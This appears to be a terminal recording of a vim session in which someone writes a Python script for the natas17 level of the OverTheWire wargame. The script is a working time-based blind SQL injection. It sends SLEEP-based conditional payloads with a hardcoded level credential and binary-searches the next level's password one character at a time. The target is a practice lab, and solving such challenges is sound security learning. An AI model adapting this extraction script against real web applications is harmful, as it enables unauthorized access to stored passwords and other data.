[25.075556, "o", "\u001b[1;1Himport time, urllib.request, urllib.parse, base64\r\r\n# natas17: totally blind SQLi (no echo). Timing oracle: the WHERE clause matches\r\r\n# ~4 rows, so IF(cond, SLEEP(5), 0) sleeps 4x5 = ~20 s when true, ~0.5 s when\r\r\n# false. We binary-search the ASCII code (32..126) of each password character.\r\r\nurl = \"http://natas17.natas.labs.overthewire.org/\"\r\r\nauth = \"Basic \" + base64.b64encode(b\"natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx\").decode()\r\r\ndef true_cond(p):\r\r\n    d = urllib.parse.urlencode({\"username\": p}).encode()\r\r\n    r = urllib.request.Request(url, data=d, headers={\"Authorization\": auth})\r\r\n    t0 = time.time()\r\r\n    urllib.request.urlopen(r, timeout=90).read()\r\r\n    return time.time() - t0 > 10\r\r\nout = \"\"\r\r\nfor pos in range(1, 33):\r\r\n    lo, hi = 32, 126\r\r\n    while lo < hi:\u001b[17;9Hmid = (lo + hi) // 2\u001b[18;9Hif true_cond(f'x\" OR IF(ORD(SUBSTR(password,{pos},1))>{mid},SLEEP(5),0)-- -'):\u001b[19;13Hlo = mid + 1\u001b[20;9Helse:\u001b[21;13Hhi = mid\r\r\n    out += chr(lo)\r\r\n    print(out, flush=True)\r\r\nprint(\"FINAL\", out)\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                                                                             \u001b[27;1H~                                                                                                             \u001b[28;1H~                                                                                                             \u001b[29;1H~                                                                                                             \u001b[30;1H~                                                                                                             \u001b[31;1H~                                                                                                             \u001b[32;1H~                                                                                                             \u001b[33;1H~                                                                                                             \u001b[?25h\u001b[1;1H\u001b[?4m"]
[42.93493, "o", "\u0007\u001b[?25l\u001b[m\u001b[34;1H\u001b[K\u001b[34;1H:set noai nocin nosi indentexpr=\r\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                             \u001b[3;1H~                                                                                                             \u001b[4;1H~                                                                                                             \u001b[5;1H~                                                                                                             \u001b[6;1H~                                                                                                             \u001b[7;1H~                                                                                                             \u001b[8;1H~                                                                                                             \u001b[9;1H~                                                                                                             \u001b[10;1H~                                                                                                             \u001b[11;1H~                                                                                                             \u001b[12;1H~                                                                                                             \u001b[13;1H~                                                                                                             \u001b[14;1H~                                                                                                             \u001b[15;1H~                                                                                                             \u001b[16;1H~                                                                                                            